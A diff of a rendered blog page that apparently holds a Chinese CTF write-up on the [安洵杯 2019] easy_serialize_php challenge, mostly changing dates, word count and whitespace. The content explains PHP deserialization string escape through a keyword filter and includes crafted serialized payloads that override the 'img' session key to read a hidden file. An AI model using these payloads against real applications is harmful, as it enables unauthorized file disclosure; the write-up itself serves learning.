@@ -509,14 +509,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-20
+                    2021-08-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    727
+                    718
                 </div>
                 
 
@@ -546,7 +546,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="刷题笔记-安洵杯-2019-easy-serialize-php"><a href="#刷题笔记-安洵杯-2019-easy-serialize-php" class="headerlink" title="刷题笔记:[安洵杯 2019]easy_serialize_php"></a>刷题笔记:[安洵杯 2019]easy_serialize_php</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化字符串逃逸]</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化字符串逃逸]</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 <span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -602,17 +602,17 @@
 <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'L2QwZzNfZmxsbGxsbGFn'</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span>
-    
+
 a:3:&#123;s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>假设后台存在一个过滤机制，会将含flag字符替换为空，那么以上序列化字符串过滤结果为</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"dd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>第二个s所对应的数字，本来由于有6个flag字符所以为24，现在这6个flag都被过滤了，那么它将会尝试向后读取24个字符看看是否满足序列化的规则，<br>也即读取;s:8:”function”;s:59:”a,读取这24个字符后以”;结尾，恰好满足规则，而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则，所以序列化结果为：</p>
-<pre class="line-numbers language-none"><code class="language-none">array(3) &#123; 
-[&quot;user&quot;]&#x3D;&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot; 
-[&quot;img&quot;]&#x3D;&gt; string(20) &quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot; 
-[&quot;dd&quot;]&#x3D;&gt; string(1) &quot;a&quot; 
+<pre class="line-numbers language-none"><code class="language-none">array(3) &#123;
+[&quot;user&quot;]&#x3D;&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;
+[&quot;img&quot;]&#x3D;&gt; string(20) &quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;
+[&quot;dd&quot;]&#x3D;&gt; string(1) &quot;a&quot;
 &#125;
 
 $_SESSION[&quot;user&quot;]&#x3D;&#39;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#39;;
@@ -630,7 +630,7 @@ $_SESSION[&quot;dd&quot;]&#x3D;&#39;a&#39;;<span aria-hidden="true" class="line-
 ​
     <span class="token comment">#方法二</span>
     <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagphp'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">';s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>
-   
+
     <span class="token comment">#方法三</span>
     <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:2:"aa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>
 ​
